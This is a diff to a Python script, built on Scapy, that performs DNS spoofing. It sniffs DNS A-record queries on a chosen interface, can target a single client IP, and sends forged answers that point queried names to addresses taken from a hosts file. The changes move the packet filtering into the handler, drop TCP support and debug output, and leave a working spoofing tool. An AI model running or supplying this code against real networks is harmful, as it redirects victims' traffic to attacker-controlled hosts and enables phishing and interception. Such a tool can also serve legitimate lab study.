@@ -1,6 +1,6 @@
 import argparse
 import sys
-from scapy.all import sniff, send, IP, UDP, TCP, DNS, DNSQR, DNSRR, conf
+from scapy.all import sniff, send, IP, UDP, DNS, DNSQR, DNSRR, conf
 
 
 def load_hosts(path):
@@ -24,21 +24,6 @@ def should_spoof(pkt, target_ip):
         return False
     if target_ip and pkt[IP].src != target_ip:
         return False
-    if pkt.haslayer(TCP):
-        pkt = pkt[2:]
-        if not pkt.haslayer(DNS):
-            return False
-    else:
-        if not pkt.haslayer(DNS):
-            return False
-    if not pkt.haslayer(DNSQR):
-        return False
-    if pkt[DNS].qr != 0:
-        return False
-    # Only handle DNS Type A (IPv4) queries (qtype=1)
-    if pkt[DNSQR].qtype != 1:
-        return False
-    
     return True
 
 
@@ -58,16 +43,21 @@ def make_response(pkt, spoof_ip):
 
 
 def handle_packet(pkt, hosts, target_ip):
+    if not pkt.haslayer(DNSQR) or not pkt.haslayer(UDP):
+        return
+    if pkt[DNS].qr != 0:
+        return
+    # Only handle DNS Type A (IPv4) queries (qtype=1)
+    if pkt[DNSQR].qtype != 1:
+        return
     if not should_spoof(pkt, target_ip):
         return
-    print("should spoof")
     qname = pkt[DNSQR].qname.decode(errors="ignore").lower()
-    #if not qname.endswith("."):
-    #   qname += "."
+    if not qname.endswith("."):
+        qname += "."
     spoof_ip = hosts.get(qname)
     if not spoof_ip:
         return
-    print("got spoof ip")
     response = make_response(pkt, spoof_ip)
     print(f"[*] Spoofed {qname} -> {spoof_ip}")
     send(response, verbose=0)
@@ -89,26 +79,14 @@ def run_dns_spoof(iface, target_ip, hosts_file):
         print("Stopping.")
 
 
-def debug(args):
-    print("Checking file:")
-    hosts = load_hosts(args.hosts_file)
-    if not hosts:
-        print("No host mappings loaded.")
-    else:
-        print(hosts)
-    run_dns_spoof(args.iface, args.target_ip, args.hosts_file)
-
-def main(): # NOT USED
+def main():
     parser = argparse.ArgumentParser(description="DNS spoofing with Scapy")
     parser.add_argument("-i", "--iface", help="Interface to listen on")
     parser.add_argument("-t", "--target-ip", help="Only spoof this client IP")
     parser.add_argument("-f", "--hosts-file", default="dns-file.txt", help="Host mapping file")
-    parser.add_argument("-d", "--debug", action="store_true", help="Debug mode")
     args = parser.parse_args()
-    if (args.debug):
-        debug(args)
     run_dns_spoof(args.iface, args.target_ip, args.hosts_file)
 
-# -i Wi-Fi  -t 10.30..59.231 -g 
+
 if __name__ == "__main__":
     sys.exit(main())
